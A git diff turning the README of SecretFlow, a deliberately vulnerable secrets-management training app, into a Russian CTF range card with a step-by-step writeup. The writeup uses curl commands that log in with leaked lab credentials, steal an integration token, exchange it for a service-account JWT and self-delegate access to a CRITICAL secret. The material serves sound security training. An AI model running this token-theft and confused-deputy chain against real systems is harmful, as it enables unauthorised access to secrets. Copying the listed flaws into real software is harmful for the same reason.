@@ -1,312 +1,307 @@
-# SecretFlow
-
-**Enterprise Secrets Access Management Platform**
-
-A realistic vulnerable application for cyber security exercises.
-
-**Версия:** 2.0 — Security Hardened + New HARD Attack Path
-
+﻿---
+difficulty:
+  - Средний
+office:
+  - IT и телекоммуникация
+segment:
+  - SRV
+tags:
+  - web
+  - api
+  - secrets
+  - ctf
+interface: ens18 / netplan
+vulns: IDOR, CWE-284, CWE-256, Confused Deputy
+os: Debian 12
+hostname: secretflow.city.stf
+git: https://github.com/example/secretflow
 ---
 
-## Обзор
+> [!info] Information
+> Hostname: **`secretflow.city.stf`**
+> Difficulty: **`Средний`**
+> Office: **`IT и телекоммуникация`**
+> Segment: **`SRV`**
+> Git: **`https://github.com/example/secretflow`**
+> Tags: **`web, api, secrets, ctf`**
+> Interface: **`ens18 / netplan`**
+> OS: **`Debian 12`**
 
-SecretFlow — это внутренняя платформа управления доступом к секретам, которая позволяет сотрудникам:
-- Просматривать доступные секреты (только метаданные)
-- Запрашивать доступ к секретам с обоснованием
-- Одобрять/отклонять запросы на доступ в зависимости от классификации
-- Поддерживать доверенную автоматизацию (CI/CD интеграции)
-- Аудит всех операций доступа и административных действий
+> [!error] Критическое событие
+> Утечка CRITICAL-секрета `PROD_DB_MASTER_PASSWORD` из внутренней платформы управления секретами SecretFlow.
 
-**Назначение:** Учебное приложение с преднамеренными уязвимостями безопасности для упражнений по пентесту и CTF.
+> [!question] Задача
+> Получите доступ к CRITICAL-секрету `PROD_DB_MASTER_PASSWORD` через эксплуатацию уязвимостей приложения и подтвердите успешную компрометацию флагом.
 
----
+> [!info] Легенда
+> Компания запустила внутренний сервис SecretFlow для управления доступом к секретам инфраструктуры. Платформа используется разработчиками, тимлидами и security-командой для выдачи временных доступов к ключам и паролям продакшена.
+>
+> За сутки до запуска учений в корпоративном чате появилась выгрузка из старого трекера задач, куда по ошибке попали тестовые данные onboarding. В выгрузке обнаружены рабочие учетные данные разработчика:
+>
+> - `dev.alice`
+> - `password123`
+>
+> По официальной версии это «устаревшие тестовые креды», но вход в систему по ним работает. Ваша цель как участника red-team — проверить, можно ли с минимального доступа эскалировать привилегии и добраться до CRITICAL-секретов.
+>
+> Важно: утечка `dev.alice/password123` должна присутствовать в легенде и использоваться как начальная точка атаки.
 
-## Быстрый старт
+<div style="page-break-after: always;"></div>
 
-### Требования
-- Docker & Docker Compose
-- Git
+# Донастройка хоста
 
-### Установка
+## Смена FQDN
 
-1. **Клонирование и настройка:**
 ```bash
-cd secretflow
+sed -i 's/secretflow\.city\.stf/YOUR_FQDN/g' /etc/hosts
+hostnamectl set-hostname YOUR_FQDN
+reboot now
+```
+
+## Запуск стенда
+
+```bash
+cd /opt/secretflow
 cp .env.example .env
+docker compose up -d --build
 ```
 
-2. **Запуск всех сервисов:**
+## Проверка доступности
+
 ```bash
-docker-compose up -d
+curl -s http://127.0.0.1:8080/health
+curl -I http://127.0.0.1:3000
 ```
 
-3. **Ожидание инициализации базы данных** (~30 секунд)
+<div style="page-break-after: always;"></div>
 
-4. **Доступ к приложению:**
-- Frontend: http://localhost:3000
-- Backend API: http://localhost:8080
-- PostgreSQL: localhost:5432
+# Уязвимый стенд
 
-### Учетные данные по умолчанию
+## Статус сервисов
 
-| Username | Password | Role |
-|----------|----------|------|
-| dev.alice | password123 | developer |
-| dev.bob | strong random | developer |
-| lead.carol | strong random | team_lead |
-| security.dave | strong random | security_admin |
-| svc.gitlab | strong random | service_account |
-
-> ⚠️ Только `dev.alice` имеет известный слабый пароль — это преднамеренно скомпрометированная учетная запись.
-
----
-
-## Архитектура
-
-```
-┌─────────────┐     ┌─────────────┐     ┌─────────────┐
-│   Frontend  │────▶│   Backend   │────▶│  PostgreSQL │
-│  (React)    │     │    (Go)     │     │             │
-└─────────────┘     └─────────────┘     └─────────────┘
-```
-
-### Технологический стек
-
-**Backend:**
-- Go 1.21
-- Gin framework
-- GORM (PostgreSQL ORM)
-- JWT authentication
-- bcrypt password hashing
-- Server-Sent Events (SSE) для realtime-уведомлений
-
-**Frontend:**
-- React 18
-- TypeScript
-- Vite
-- TailwindCSS
-- React Router
-
-**Infrastructure:**
-- Docker Compose
-- PostgreSQL 15
-
----
-
-## Сценарии атак
-
-### Цель
-Получить доступ к CRITICAL-секрету: `PROD_DB_MASTER_PASSWORD`
-
-### Пути атаки
-
-#### Path 1: Integration Token Leak (MEDIUM)
-1. Аутентифицироваться как любой пользователь
-2. Найти `/api/internal/integrations/status` endpoint
-3. Получить webhook_url из ответа
-4. Использовать интеграционный токен (из seed-данных или другого источника)
-5. Вызвать `/api/integrations/webhook` с токеном
-6. Запросить доступ к CRITICAL-секрету
-7. Auto-approved due to trusted token
-
-#### Path 2: Confused Deputy + Trust Boundary (HARD) ⭐
-Многошаговая атака через делегирование доступа:
-
-1. **Разведка:** Найти `/api/delegate/info` для понимания flow
-2. **Получение токена:** Использовать интеграционный токен из Path 1
-3. **Обмен токена:** Вызвать `/api/service-account/exchange` для получения service account JWT
-4. **Делегирование:** Вызвать `/api/delegate/access` с target_user_id = свой ID
-5. **Получение секрета:** Использовать созданный грант для доступа к CRITICAL-секрету
-
-**Тип уязвимости:** Trust Boundary Confusion + Confused Deputy
-
-**Почему работает:**
-- Service account JWT доверяет делегированию доступа
-- Нет проверки scope токена против запрашиваемого секрета
-- Атакующий использует service account как "доверенное лицо" для эскалации привилегий
-
-#### Path 3: Internal API Misuse (DISABLED)
-Endpoint'ы `/api/internal/secrets/grant` и `/api/internal/apply` отключены.
-
-### Тупики (Dead Ends)
-- Normal request flow требует approval от `security_admin` для CRITICAL (correctly enforced)
-- Webhook без валидного токена возвращает 401
-- `/api/audit/logs` теперь требует роль `security_admin`
-- LOW/MEDIUM секреты доступны, но не содержат целевой флаг
-
----
-
-## API Документация
-
-### Authentication
-```
-POST /api/auth/login
-Body: {"username": "dev.alice", "password": "password123"}
-Response: {"token": "eyJ...", "user": {...}}
-```
-
-### Secrets
-```
-GET /api/secrets
-GET /api/secrets/:id
-GET /api/secrets/:id/value (requires grant)
-POST /api/secrets/:id/request
-```
-
-### Access Requests
-```
-GET /api/requests
-POST /api/requests
-POST /api/requests/:id/approve
-POST /api/requests/:id/deny
-```
-
-### Integrations
-```
-GET /api/integrations (security_admin only)
-POST /api/integrations/webhook (token auth)
-```
-
-### Delegation (NEW — HARD Path 2)
-```
-GET  /api/delegate/info
-POST /api/service-account/exchange (integration token → service account JWT)
-POST /api/delegate/access (requires service_account role)
-```
-
-### Events (NEW — Realtime Notifications)
-```
-GET /api/events/stream (Server-Sent Events)
-```
-
-### Audit Logs
-```
-GET /api/audit/logs (security_admin only)
-GET /api/audit/stats (security_admin only)
-```
-
----
-
-## Database Schema
-
-### Tables (8 total)
-1. `users` — User accounts and roles
-2. `secrets` — Secret metadata and values
-3. `access_requests` — Access request tracking
-4. `access_grants` — Active access permissions
-5. `integrations` — External integration config
-6. `integration_tokens` — Authentication tokens
-7. `audit_logs` — Audit trail
-8. `debug_config` — Debug/development config
-
-См. `backend/migrations/001_initial_schema.sql` для полной схемы.
-
----
-
-## Уязвимости (Версия 2.0)
-
-| ID | Уязвимость | CWE | Статус | Локация |
-|----|------------|-----|--------|---------|
-| V1 | Integration status leaks webhook URLs | CWE-215 | ⚠️ ACTIVE | `GET /api/internal/integrations/status` |
-| V2 | Tokens stored in plaintext | CWE-256 | ⚠️ ACTIVE | `integration_tokens` table |
-| V3 | Token scope not enforced in webhook | CWE-284 | ⚠️ ACTIVE | `webhook_service.go` |
-| V4 | Audit logs leak sensitive data | CWE-532 | ✅ FIXED | `audit_service.go` |
-| V5 | Classification bypass via automation | CWE-284 | ⚠️ ACTIVE | `approval_service.go` |
-| V6 | Trust Boundary в delegation | CWE-284 | ⚠️ ACTIVE (HARD) | `delegate_service.go` |
-| V7 | Missing auth on internal endpoint | CWE-306 | ✅ DISABLED | `internal.go` |
-| V8 | Audit logs accessible без role check | CWE-284 | ✅ FIXED | `handlers/audit.go` |
-
-### Исправления в версии 2.0
-
-**Session/Auth Hardening:**
-- Введен `StrictAuth` middleware для четкой маркировки endpoints
-- Единый формат ошибок API
-- Немедленный отказ (401/403) при невалидной сессии
-- Никаких side-effects (insert/update/audit) до успешной аутентификации
-
-**Path 2 (старый) Closed:**
-- `/api/audit/logs` и `/api/audit/stats` теперь требуют `security_admin`
-- Токены больше не логируются в audit events (masked preview только)
-- `/api/internal/integrations/status` не возвращает `auth_token`
-- `/api/internal/integrations/test/:id` требует `security_admin` и возвращает только preview
-
----
-
-## Разработка
-
-### Backend
 ```bash
-cd backend
-go mod tidy
-go run cmd/server/main.go
+docker compose ps
 ```
 
-### Frontend
+Отметьте галочками:
+✅ Уязвимую машину можно **перезапускать**  
+✅ Последний снапшот должен быть **с памятью**  
+✅ Сервису нужен доступ **в Интернет**
+
+## Смена флагов
+
 ```bash
-cd frontend
-npm install
-npm run dev
+# Пример: заменить флаг в миграции (перед сборкой нового образа)
+sed -i 's/flag{prod_db_master_[^}]\+}/YOUR_FLAG_HERE/g' /opt/secretflow/backend/migrations/001_initial_schema.sql
 ```
 
-### Database
+# Работающие процессы и сервисы
+
+| Service | Address | Description |
+|---|---|---|
+| secretflow-frontend | 0.0.0.0:3000 | Web UI |
+| secretflow-backend | 0.0.0.0:8080 | API |
+| secretflow-db | internal docker network only | PostgreSQL |
+
+Сеть настроена через **Docker bridge**.
+
+<div style="page-break-after: always;"></div>
+
+# Доступы
+
+| # | Login | Pass |
+|---|---|---|
+| app user | `dev.alice` | `password123` |
+| db app user | `${DB_USER}` (из `.env`) | `${DB_PASSWORD}` (из `.env`) |
+| app admin | `security.dave` | `not disclosed` |
+
+# Пароли для брута
+
+НЕТ
+
+# Writeup
+
+## Шаг 1 - Сбор информации
+
+Проверяем доступность приложения и API:
+
 ```bash
-docker-compose exec db psql -U secretflow -d secretflow
+curl -s http://127.0.0.1:8080/health
+curl -I http://127.0.0.1:3000
 ```
 
-### Build & Test
+Авторизуемся под утекшей учеткой `dev.alice`:
+
 ```bash
-# Backend
-cd backend
-go build ./...
+TOKEN=$(curl -s -X POST http://127.0.0.1:8080/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"dev.alice","password":"password123"}' | jq -r '.token')
 
-# Frontend
-cd frontend
-npm run build
+echo "$TOKEN"
 ```
 
----
+Проверяем, что токен валиден:
 
-## Новые функции (Версия 2.0)
+```bash
+curl -s http://127.0.0.1:8080/api/auth/me \
+  -H "Authorization: Bearer $TOKEN"
+```
 
-### Realtime-уведомления
-- Server-Sent Events (SSE) через `/api/events/stream`
-- Индикатор подключения в UI
-- Автоматический reconnect при обрыве
+## Шаг 2 - Разведка и поиск целевого секрета
 
-### Улучшенный UX
-- Фильтры по статусу и классификации на странице запросов
-- Сортировка запросов (newest/oldest/classification)
-- Улучшенные состояния loading/error/empty
-- Визуальные индикаторы для разных типов уведомлений
+### 2.1 Разведка через DevTools (как найти endpoint'ы)
 
-### Quality of Life
-- Bulk-approval готовность для team_lead
-- Экспорт audit logs (готовность к расширению)
-- Улучшенная навигация и feedback в UI
+1. Открыть приложение `http://127.0.0.1:3000` и войти под `dev.alice`.
+2. Открыть DevTools:
+   - Chrome/Edge: `F12` или `Ctrl+Shift+I`
+   - Firefox: `F12`
+3. Перейти во вкладку `Network`.
+4. Включить фильтр `Fetch/XHR`.
+5. Отметить `Preserve log`, чтобы запросы не очищались при переходах.
+6. В поле фильтра ввести `/api/`, чтобы видеть только backend-вызовы.
+7. Пройти по ключевым страницам UI:
+   - `Dashboard`
+   - `Secrets`
+   - `My Requests`
+   - Открыть любой секрет
+8. По каждому найденному запросу смотреть:
+   - `Request URL`
+   - `Request Method`
+   - `Status Code`
+   - `Request Payload` (для POST)
+   - `Response`
+9. Для повторения запроса:
+   - ПКМ по запросу -> `Copy` -> `Copy as cURL`
+   - Вставить в терминал и адаптировать под свой токен.
 
----
+Обычно на этом хосте обнаруживаются такие endpoint'ы:
+- `POST /api/auth/login`
+- `GET /api/auth/me`
+- `GET /api/secrets`
+- `GET /api/secrets/:id`
+- `GET /api/secrets/:id/value`
+- `POST /api/secrets/:id/request`
+- `GET /api/delegate/info`
+- `POST /api/service-account/exchange`
+- `POST /api/delegate/access`
+- `POST /api/integrations/webhook`
 
-## License
+### 2.1.1 Быстрый способ через Sources (по коду фронта)
 
-MIT License — For educational purposes only.
+Если нужно быстрее собрать список endpoint'ов без кликанья по страницам:
 
-⚠️ **Do not deploy to production.** This application contains intentional security vulnerabilities.
+1. Открыть DevTools -> `Sources`.
+2. Открыть основной JS-бандл (`/assets/index-*.js`).
+3. Нажать глобальный поиск:
+   - Windows/Linux: `Ctrl+Shift+F`
+   - macOS: `Cmd+Option+F`
+4. Искать строку: `"/api/` или просто `api/`.
+5. По найденным местам выписать endpoint'ы из вызовов `fetch(...)` / API-клиента.
 
----
+Плюс метода:
+- Можно быстро увидеть почти все роуты сразу.
+- Не зависит от того, какие экраны вы уже открыли в UI.
 
-## Changelog
+### 2.2 Поиск целевого секрета
 
-### v2.0 — Security Hardened
-- ✅ Session/auth hardening — no side-effects before auth
-- ✅ Closed old Path 2 (audit log replay)
-- ✅ Added new HARD Path 2 (Confused Deputy)
-- ✅ Realtime notifications via SSE
-- ✅ Request filters and improved UX
-- ✅ Standardized error responses
-- ✅ Role-based access control enforced
+Получаем список секретов и находим `PROD_DB_MASTER_PASSWORD`:
 
-### v1.0 — Initial Release
-- Basic secrets management flow
-- 3 attack paths (1 config leak, 2 audit replay, 3 internal API)
-- Simple React frontend
-- Go/Gin backend
+```bash
+curl -s http://127.0.0.1:8080/api/secrets \
+  -H "Authorization: Bearer $TOKEN" | jq .
+```
+
+Сохранить UUID целевого секрета:
+
+```bash
+SECRET_ID="<uuid-prod-db-master-password>"
+```
+
+### 2.3 Проверка подсказок delegation-flow
+
+Проверяем подсказки по delegation-flow:
+
+```bash
+curl -s http://127.0.0.1:8080/api/delegate/info \
+  -H "Authorization: Bearer $TOKEN" | jq .
+```
+
+## Шаг 3 - Эксплуатация (вариант HARD, основной)
+
+Сначала извлекаем интеграционный токен из operational endpoint:
+
+```bash
+INTEGRATION_TOKEN=$(curl -s http://127.0.0.1:8080/api/internal/integrations/status \
+  -H "Authorization: Bearer $TOKEN" | jq -r '.integrations[0].auth_token')
+
+echo "$INTEGRATION_TOKEN"
+```
+
+Обмениваем integration token на JWT service account:
+
+```bash
+SERVICE_TOKEN=$(curl -s -X POST http://127.0.0.1:8080/api/service-account/exchange \
+  -H "Content-Type: application/json" \
+  -d "{\"integration_token\":\"$INTEGRATION_TOKEN\",\"purpose\":\"CI/CD debugging session\"}" \
+  | jq -r '.service_token')
+
+echo "$SERVICE_TOKEN"
+```
+
+Получаем свой user id:
+
+```bash
+MY_ID=$(curl -s http://127.0.0.1:8080/api/auth/me \
+  -H "Authorization: Bearer $TOKEN" | jq -r '.user.id')
+
+echo "$MY_ID"
+```
+
+Делегируем доступ самому себе на CRITICAL-секрет:
+
+```bash
+curl -s -X POST http://127.0.0.1:8080/api/delegate/access \
+  -H "Authorization: Bearer $SERVICE_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d "{
+    \"secret_id\": \"$SECRET_ID\",
+    \"target_user_id\": \"$MY_ID\",
+    \"justification\": \"Temporary access for debugging\",
+    \"duration_hours\": 24
+  }" | jq .
+```
+
+Читаем значение секрета:
+
+```bash
+curl -s http://127.0.0.1:8080/api/secrets/$SECRET_ID/value \
+  -H "Authorization: Bearer $TOKEN" | jq .
+```
+
+## Шаг 4 - Альтернативная эксплуатация (MEDIUM)
+
+Если хотите короткий путь через webhook:
+
+```bash
+curl -s -X POST http://127.0.0.1:8080/api/integrations/webhook \
+  -H "Content-Type: application/json" \
+  -d "{
+    \"token\": \"gf_prod_abc123xyz789\",
+    \"secret_id\": \"$SECRET_ID\",
+    \"justification\": \"Automated deployment\"
+  }" | jq .
+```
+
+## Шаг 5 - Реализация критического события
+
+Критическое событие считается выполненным, когда получено значение:
+
+```json
+{
+  "secret": {
+    "name": "PROD_DB_MASTER_PASSWORD",
+    "value": "flag{...}"
+  }
+}
+```
+
+Сохраните полученный `flag{...}` как подтверждение успешной компрометации.
